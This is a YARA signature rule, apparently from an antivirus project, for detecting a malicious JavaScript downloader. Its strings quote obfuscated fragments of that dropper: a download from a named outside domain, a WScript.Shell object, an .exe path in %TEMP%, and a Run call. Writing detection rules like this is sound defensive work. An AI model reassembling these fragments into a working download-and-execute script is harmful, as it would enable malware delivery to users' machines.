rule sig_20160330_22a6c95b64894f5327a44dc6baed5aae {
  meta:
    description = "datamaliciousorder - file 20160330_22a6c95b64894f5327a44dc6baed5aae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c27425f134c3d7581caa4cf61a8a36d78eff511e39446c74dcab16f9a1d0b13d"

  strings:
    $s1  = "_I0[_N0](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "var _WS = function _C() {return WScript[_UI](\"WScript\"+\".Shell\");}(), _W0 = 11;" fullword ascii
    $s3  = "function _Y(_B0, _M0){_MB = _MB * 1; return _B0 - _M0;};" fullword ascii
    $s4  = "if (_I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _ZA() {return _WS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2tz403OnGxYPXaEW.ex\" + \"e\";};" fullword ascii
    $s6  = "function _V(){return _TC + \"\";};" fullword ascii
    $s7  = "function _S(_N1){_WS[\"Run\"](_N1, _MB, _MB);};" fullword ascii
    $s8  = "function _NG() {return ((_RA == true) && (_RA == _CX)) ? 1 : _MB;};" fullword ascii
    $s9  = " while (_M){" fullword ascii
    $s10 = "function _PJ(_R) {var _ZE = (1, 2, 3, 4, 5, _R); return _ZE;};" fullword ascii
    $s11 = "function _N(){return 22;};" fullword ascii
    $s12 = "var _I = new this[\"Date\"]();" fullword ascii
    $s13 = "return _Y(_G, _V1);" fullword ascii
    $s14 = "function _C0()" fullword ascii
    $s15 = "function _YL(){return _UI;};" fullword ascii
    $s16 = "var _RA = false;" fullword ascii
    $s17 = "_CX = true; " fullword ascii
    $s18 = "_RA = true; " fullword ascii
    $s19 = "var _H = false;" fullword ascii
    $s20 = "var _CX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}